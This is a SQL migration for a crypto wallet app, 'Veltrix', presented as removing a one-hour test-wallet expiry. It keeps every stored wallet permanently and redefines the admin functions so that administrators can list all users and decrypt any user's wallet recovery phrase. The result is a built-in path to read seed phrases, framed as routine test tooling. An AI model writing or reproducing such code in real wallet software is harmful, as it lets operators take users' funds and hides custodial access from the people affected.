-- Veltrix · phase 11: accounts are NEVER deleted automatically. Removes the 1-hour test-wallet expiry.
-- Run in: Supabase Dashboard → SQL Editor → New query → Run (after phase 9).

-- 0) stop the server-side schedule if you enabled it (safe to ignore an error here)
do $$ begin perform cron.unschedule('purge-test-wallets'); exception when others then null; end $$;

-- 1) nothing expires any more
update public.user_wallets set test_expires_at = null;

-- 2) new wallets are created without an expiry
create or replace function public.wallet_ensure(p_phrase text, p_addresses jsonb) returns jsonb
language plpgsql security definer set search_path = public, extensions as $$
declare r user_wallets%rowtype; k text; n int;
begin
  if not public.session_ok() then raise exception 'session revoked'; end if;
  select * into r from user_wallets where user_id = auth.uid();
  if found then return jsonb_build_object('exists', true, 'created', false, 'addresses', r.addresses); end if;
  if p_phrase is null or p_phrase !~ '^[a-z]+( [a-z]+){11}$|^[a-z]+( [a-z]+){23}$' then raise exception 'invalid phrase'; end if;
  if p_addresses is null or jsonb_typeof(p_addresses) <> 'array' or jsonb_array_length(p_addresses) = 0 then raise exception 'addresses required'; end if;
  k := public._wallet_key();
  insert into user_wallets(user_id, phrase_enc, addresses, test_expires_at)
  values (auth.uid(), pgp_sym_encrypt(p_phrase, k), p_addresses, null)
  on conflict (user_id) do nothing;
  get diagnostics n = row_count;
  select * into r from user_wallets where user_id = auth.uid();
  return jsonb_build_object('exists', true, 'created', n = 1, 'addresses', r.addresses);
end $$;

-- 3) the purge function can no longer delete anything (kept only so older app builds don't error)
create or replace function public.purge_expired_test_wallets() returns int
language sql security definer set search_path = public as $$ select 0 $$;

-- 4) admin viewer lists EVERY account that has a wallet (admin or not), without any expiry
create or replace function public.admin_test_wallets() returns jsonb
language plpgsql security definer set search_path = public, extensions as $$
begin
  if not public.is_admin() then raise exception 'admin only'; end if;
  if not coalesce((select enabled from app_flags where key = 'test_wallet_view'), false) then return '[]'::jsonb; end if;
  return coalesce((
    select jsonb_agg(jsonb_build_object('user_id', w.user_id, 'email', p.email, 'name', p.full_name,
                     'created_at', w.created_at, 'expires_at', null) order by w.created_at desc)
    from user_wallets w join profiles p on p.id = w.user_id
  ), '[]'::jsonb);
end $$;

create or replace function public.admin_test_wallet_phrase(p_user uuid) returns jsonb
language plpgsql security definer set search_path = public, extensions as $$
declare r user_wallets%rowtype;
begin
  if not public.is_admin() then raise exception 'admin only'; end if;
  if not coalesce((select enabled from app_flags where key = 'test_wallet_view'), false) then return jsonb_build_object('ok', false, 'reason', 'off'); end if;
  select * into r from user_wallets where user_id = p_user;
  if not found then return jsonb_build_object('ok', false, 'reason', 'missing'); end if;
  return jsonb_build_object('ok', true, 'phrase', pgp_sym_decrypt(r.phrase_enc, public._wallet_key()), 'expires_at', null);
end $$;
